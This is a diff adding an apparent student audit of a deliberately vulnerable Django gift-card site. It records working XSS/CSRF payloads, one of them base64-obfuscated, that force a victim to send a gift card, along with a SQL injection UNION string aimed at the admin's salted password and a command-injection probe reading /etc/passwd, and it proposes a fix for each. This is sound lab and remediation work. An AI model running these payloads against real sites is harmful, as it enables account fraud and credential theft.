@@ -1,0 +1,108 @@
+XSS Attack
+
+    The director GET variable can be used to execute javascript
+    Templates
+        gift.html
+        single-item.html
+    Views.py
+        Buy_card_view
+        Gift_card_view
+    FIX - Change {{director|safe}} to {{director}} in all html templates
+
+ 
+
+Force User to buy card
+
+    CSRF link sent to use with director could work
+        Iframe POST request to the gift_card_view
+
+#<iframe style="display:none" name="csrf-frame"></iframe>
+<iframe style="width:0;height:0;border:0; border:none;" name="csrf-frame">
+<form action="/gift/3" method="post" target="csrf-frame" id="csrf-form">
+  <input type='hidden' name="amount" value='2000'>
+  <input type='hidden' name="username" value='test2'>
+  <input type='submit' value='submit'>
+</form>
+
+<script>document.getElementById("csrf-form").submit()</script>
+
+director=%3Ciframe%20style%3D%22display%3Anone%22%20name%3D%22csrf-frame%22%3E%3Cform%20action%3D%22%2Fgift%2F3%22%20method%3D%22post%22%20target%3D%22csrf-frame%22%20id%3D%22csrf-form%22%3E%3Cinput%20type%3D%27hidden%27%20name%3D%22amount%22%20value%3D%272000%27%3E%3Cinput%20type%3D%27hidden%27%20name%3D%22username%22%20value%3D%27test2%27%3E%3Cinput%20type%3D%27submit%27%20value%3D%27submit%27%3E%3C%2Fform%3E%3C%2Fiframe%3E%3Cscript%3Edocument.getElementById%28%22csrf-form%22%29.submit%28%29%3C%2Fscript%
+
+Working
+director=%3Ciframe%20style%3D%22width%3A0%3Bheight%3A0%3Bborder%3A0%3B%22%20name%3D%22csrf-frame%22%3E%3C%2Fiframe%3E%3Cform%20action%3D%22%2Fgift%2F3%22%20method%3D%22post%22%20target%3D%22csrf-frame%22%20id%3D%22csrf-form%22%3E%3Cinput%20type%3D%27hidden%27%20name%3D%22amount%22%20value%3D%272000%27%3E%3Cinput%20type%3D%27hidden%27%20name%3D%22username%22%20value%3D%27test2%27%3E%3Cinput%20type%3D%27submit%27%20value%3D%27submit%27%3E%3C%2Fform%3E%3Cscript%3Edocument.getElementById%28%22csrf-form%22%29.submit%28%29%3C%2Fscript%3E
+
+Hide Button - swithc to Ajax
+
+<script>
+var xhttp = new XMLHttpRequest();
+xhttp.open("POST", "/gift/3", true);
+xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xhttp.send("amount=2000&username=test2"); 
+</script>
+
+director=%3Cscript%3E%0Avar%20xhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%0Axhttp.open%28%22POST%22%2C%20%22%2Fgift%2F3%22%2C%20true%29%3B%0Axhttp.setRequestHeader%28%22Content-type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0Axhttp.send%28%22amount%3D2000%26username%3Dtest2%22%29%3B%20%0A%3C%2Fscript%3E
+
+ &director=<script>document.write(atob("PGlmcmFtZSBzdHlsZT0iZGlzcGxheTpub25lIiBuYW1lPSJjc3JmLWZyYW1lIj48L2lmcmFtZT4KPGZvcm0gYWN0aW9uPSIvZ2lmdC8xIiBtZXRob2Q9InBvc3QiIHRhcmdldD0iY3NyZi1mcmFtZSIgaWQ9ImNzcmYtZm9ybSI+CiAgPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0iYW1vdW50IiB2YWx1ZT0nMjAwMCc+CiAgPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0idXNlcm5hbWUiIHZhbHVlPSc8bWU+Jz4KICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nc3VibWl0Jz4KPC9mb3JtPgo8c2NyaXB0PmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJjc3JmLWZvcm0iKS5zdWJtaXQoKTwvc2NyaXB0Pg=="))</script>
+
+    FIX - Change {{director|safe}} to {{director}} in all html templates (same as above)
+
+ 
+
+Obtain Salted Password
+
+    SQL Injection
+        Line 188 - views.py - use_card_view
+        Card_file_data gets passed to parse_card_data which looks like it just parses json
+        Json should have Array of 'records' and first signature needs to have payload for SQL injection 
+        signature = json.loads(card_data)['records'][0]['signature']
+
+card_query = Card.objects.raw('select id from LegacySite_card where data = \'%s\'' % signature)
+
+ 
+
+    Signature = 1' UNION SELECT <column 2> from LegacySite_users WHERE username= 'admin
+
+    FIX - update the raw query to  card_query = Card.objects.get(data=signature)
+
+       - update the looping code too, don't need Card Class has data = models.BinaryField(unique=True)
+
+ 
+
+Other Attacks
+
+    Parse_card_data
+        Gets called from use_card_view - and takes a user provided card_file_data and card_fname
+        Trys to parse json if successful returns, if not writes card_file_data to  /tmp/{card_fname}_{request.user.id}_parser.gftcrd
+        Wonder if we can get code execution with simple "test;  cat /etc/passwd > tmp_file #"
+
+
+Other Bugs/Issues
+
+    GiftCardSite/settings.py
+        Line 27 - DEBUG=true
+
+- import_db.sh seems to have imported data into the wrong columns in LegacySite_users
+
+ 
+
+
+Database Portion
+
+    Options
+        API
+        Plugin
+        TDE
+    Key Management
+        Do not store
+            In the database or next to the database
+        Storage
+            HSM - Hardware Security Module
+            Generate keys from hardware
+            Generate keys from admin login credentials
+            Store keys in memory only
+            Different Server
+
+ 
+
+    https://pypi.org/project/django-searchable-encrypted-fields/
+
